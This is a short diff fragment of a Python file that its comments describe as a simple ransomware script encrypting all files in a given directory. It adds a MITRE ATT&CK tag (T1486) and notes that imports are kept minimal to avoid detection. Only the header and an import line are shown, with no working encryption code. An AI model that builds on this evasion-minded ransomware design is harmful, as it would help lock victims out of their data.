@@ -1,6 +1,7 @@
 #! /usr/bin/env python3
 
 # This is a simple ransomware script that encrypts all the files in a directory provided as an argument
+# T1486 - Data Encrypted for Impact
 
 # Importing necessary modules, keeped it very simple to avoid detection
 import os 
